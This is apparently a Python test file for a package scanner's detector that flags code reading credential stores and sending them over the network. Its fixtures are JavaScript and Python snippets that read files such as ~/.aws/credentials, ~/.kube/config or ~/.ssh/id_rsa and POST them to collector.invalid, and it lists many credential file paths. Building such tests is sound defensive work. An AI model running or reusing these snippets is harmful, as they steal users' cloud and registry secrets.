"""The credential stores a send is a harvest of (0.1.9, GR-7).

A file read and sent is graded by what the file is: an SSH key, `.git-credentials` or a browser's storage was a
credential store (`_CRED_STORE_RE`), so its send was a harvest ("reads credentials or the whole environment and sends
data over the network"), and an exfiltration service's address counted as where it went. The cloud's and the
registries' credential files were not: `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, gcloud's and
Azure's token files, `.npmrc`, `.pypirc`, `.netrc`, cargo's and the GitHub CLI's tokens, Vault's and Terraform's. They
are now, in every language (the engine's JavaScript, Python, Go and Rust readers and its text follower), and the path
can be written as code writes it: joined (`path.join(home, '.aws', 'credentials')`, `Path.home() / '.aws' /
'credentials'`), concatenated or in a template. A path longer than the 60 characters a source keeps is kept by its end
when only that end names the store (`shown_what`). A public key, and a file that holds no credential, are not stores.

The fixtures are the suite's inert shapes (`test_review_import_time.py`'s key read and posted), with the path changed;
hosts are `.invalid`."""

import unittest

from lazaret.registry import repo
from lazaret.scanner import core

HARVEST = "reads credentials or the whole environment and sends data over the network"
JS = ("const fs = require('fs'), os = require('os'), path = require('path');\n"
      "const k = fs.readFileSync({e});\n"
      "fetch('https://collector.invalid/k', {{method: 'POST', body: k}});\n")
PY = ("import os, requests\nfrom pathlib import Path\n"
      "requests.post('https://collector.invalid/c', data=open({e}).read())\n")
STORES = ["/.aws/credentials", "/.aws/config", "/.aws/sso/cache/x.json", "/.kube/config", "/.docker/config.json",
          "/.config/gcloud/credentials.db", "/.config/gcloud/legacy_credentials", "/.azure/msal_token_cache.json",
          "/.npmrc", "/.pypirc", "/.netrc", "/.cargo/credentials.toml", "/.config/gh/hosts.yml", "/.vault-token",
          "/.terraform.d/credentials.tfrc.json", "/.ssh/id_rsa"]
NOT_STORES = ["/.ssh/id_rsa.pub", "/.config/app/settings.json", "/.docker/daemon.json", "/.kube/cache/x", "/.bashrc"]


def reasons(text):
    return repo.import_time_risk(text)[0]


class StoresTests(unittest.TestCase):
    def test_a_store_read_and_sent_is_a_harvest(self):
        for path in STORES:
            with self.subTest(path=path):
                self.assertEqual(reasons(JS.format(e=f"process.env.HOME + '{path}'")), [HARVEST])
                self.assertEqual(reasons(PY.format(e=f"os.path.expanduser('~{path}')")), [HARVEST])

    def test_other_files_are_not(self):
        for path in NOT_STORES:
            with self.subTest(path=path):
                self.assertEqual(reasons(JS.format(e=f"process.env.HOME + '{path}'")), [])
                self.assertEqual(reasons(PY.format(e=f"os.path.expanduser('~{path}')")), [])

    def test_a_path_as_code_writes_it(self):
        for e in ("path.join(os.homedir(), '.aws', 'credentials')", "`${os.homedir()}/.aws/credentials`",
                  "os.homedir() + '/.kube/config'", "path.join(os.homedir(), '.docker', 'config.json')"):
            with self.subTest(e=e):
                self.assertEqual(reasons(JS.format(e=e)), [HARVEST])
        for e in ("os.path.join(os.path.expanduser('~'), '.aws', 'credentials')", "Path.home() / '.aws' / 'credentials'",
                  "Path.home().joinpath('.kube', 'config')"):
            with self.subTest(e=e):
                self.assertEqual(reasons(PY.format(e=e)), [HARVEST])
        self.assertEqual(reasons(JS.format(e="path.join(os.homedir(), '.aws', 'region')")), [])

    def test_a_long_path_is_kept_by_the_end_that_names_the_store(self):
        long_js = "path.join(os.homedir(), '.config', 'gcloud', 'application_default_credentials.json')"
        long_py = "os.path.join(os.path.expanduser('~'), '.config', 'gcloud', 'application_default_credentials.json')"
        self.assertEqual(reasons(JS.format(e=long_js)), [HARVEST])
        self.assertEqual(reasons(PY.format(e=long_py)), [HARVEST])
        self.assertEqual(reasons(JS.format(e=long_js.replace("application_default_credentials", "application_settings"))), [])
        # the text follower shows the end it graded: "…" and the 59 characters that end with the store's name
        (msg,) = core.install_script_risk(PY.format(e=long_py))
        shown = msg[msg.index("(") + 1:-1]
        self.assertEqual(len(shown), 60)
        self.assertTrue(shown.startswith("…") and shown.endswith("application_default_credentials.json"), shown)
        (msg,) = core.install_script_risk(PY.format(e="os.path.expanduser('~/.aws/credentials')"))
        self.assertTrue(msg.endswith("(os.path.expanduser('~/.aws/credentials'))"), "a shorter path is shown whole")


if __name__ == "__main__":
    unittest.main()
